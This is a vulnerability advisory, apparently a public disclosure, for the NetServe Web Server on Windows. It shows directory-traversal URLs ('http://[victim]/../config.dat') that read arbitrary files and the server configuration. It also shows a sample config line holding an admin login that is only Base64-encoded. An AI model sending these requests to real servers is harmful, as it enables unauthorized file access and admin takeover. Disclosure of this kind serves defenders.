The description of a product (from the developer): 
"About NetServe Web Server
NetServe is a super compact Web Server and File Sharing application for Windows NT, 95, 98, 2000, and XP.
It's HTTP Web Server can serve all types of files including html, gif and jpeg, actually any files placed in your NetServe directory can be served.
New key features include Server-Side-Include (SSI) support and CGI/1.1 support giving you the choice of your preferred scripting language, 
including but not limited to; Perl, ASP and PHP, to create your dynamic content. Other features include a fully integrated File Sharing application 
supplying a html front end to allow for directory browsing and download. A html form gives users the ability to upload up-to 5 files simultaneously to any directory.
With security in mind, NetServe features admin tools that allow you full control of how users accessing your server see the resources available, just some of the 
options include, Access served pages only, allow directory browsing, allow file downloading, and even allow file uploading.
And of course every action being performed on the NetServe Server is automatically logged, so you can interrogate the logs at a later date for statistics."

The contents:
=================
+ Advisory Information.
+ Part 1: Directory traversal vulnerability. 
+ Part 2: Viewing of a configuration servers.
+ Part 3: Access to the admin password. 
=================
Part - 1:
======
Servers does not filter " /../../ ", that allows to rise on a folder above.
The found vulnerability allows to look through contents of folders and files. 
Example: http://[victim]/../test/
Allows to see contents of a folder - /test/
Example: http://[victim]/../test/test.txt
Allows to see contents of a file test.txt which is in a folder /test/

Part- 2:
======
By default in adjustments servers the folder of a site is in [NetServe Web Server folder]\wwwroot\
If the admin did not change this adjustment, using the found vulnerability we can receive access to a file of a configuration servers. 
Example:
http://[victim]/../config.dat

================

Peart-3:
======
Using the above described vulnerability, we can receive the password of the admin for the remote administration servers. It will allow us completely to change a configuration servers! 
The password and login we can see in a file of a configuration, about which there was a 
speech above, config.dat. If you pay attention to last lines, it is possible to see the information, 
necessary to us:
====[config.dat]====
Users nimber|vietnam||bmltYmVyOnZpZXRuYW0=
Aliases /admin|D:\Program Files\NetServe Web Server\admin
====[config.dat]====

As we see a folder, in which is scripts of the admin.
I want to pay yours of attention, that the password and login are not protected!
